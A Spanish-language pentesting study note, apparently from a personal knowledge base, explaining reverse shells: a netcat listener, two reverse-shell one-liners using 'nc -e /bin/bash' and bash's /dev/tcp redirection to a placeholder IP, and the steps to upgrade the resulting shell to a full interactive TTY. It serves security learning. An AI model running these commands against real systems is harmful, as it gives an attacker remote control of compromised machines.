----------------
- Tags: #bash #shells #exploiting #hacking 
------------------
# Definición

> Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad, obteniendo una [[Shell]]. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se consigue con la posibilidad de ejecución de comandos en la máquina atacante, y de esta manera podemos ejecutar comandos en la máquina remota desde nuestra máquina.

------------
# Uso

Para ello es necesario ponernos en escucha a través de algún puerto (usualmente el 443) con [[NetCat]]:
```bash
nc -nlvp <puerto>

#Si queremos hacer uso de la herramienta rlwrap (de manera que nos funcione el ctrl-l, ir arriba y demás)
rlwrap nc -nlvp <puerto>
```

Y como podemos ejecutar comandos desde la máquina comprometida, establecemos la conexión con dicho servicio, o bien con [[NetCat]] si está instalado, o con uso de bash desde la máquina comprometida:

```bash
nc -e /bin/bash <IP> <puerto>
bash -c "bash -i >& /dev/tcp/<IP>/<puerto> 0>&1"   #En el caso que no se disponga de nc en la máquina comprometida
```

Para establecer este tipo de conexión, se pueden hacer desde diversas herramientas y comandos, los cuales está difícil saberse todos, por lo que haremos uso frecuente mente de chuletillas como [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

# Arreglo de reverse shell

La mayoría de las veces, la **reverse shell** no tendrá funcionalidad completa, como el ctrl+l, para que todo funcione correctamente tenemos que hacer lo siguiente:

Desde la **reverse shell** ejecutar lo siguiente:

```bash
script /dev/null -c bash
```

Mandamos la tarea a segundo plano con ctrl+z, y ejecutamos en **nuestra** terminal el siguiente comando:

```bash
stty raw -echo; fg
```

Sin tocar nada, ejecutamos el siguiente comando seguidamente:

```bash
reset xterm
```

Y ahora habría que ajustar el total de filas y columnas. Desde **nuestra** terminal ejecutamos lo siguiente para ver el número de filas y columnas:

```bash
stty size
```

Y para ajustarlas dentro de la **reverse shell**, ejecutamos el siguiente comando:

```bash
stty rows <nº filas> columns <nº columnas>
```

Y para terminar ejecutamos desde la **reverse shell** lo siguiente:

```bash
export TERM=xterm
export SHELL=bash
```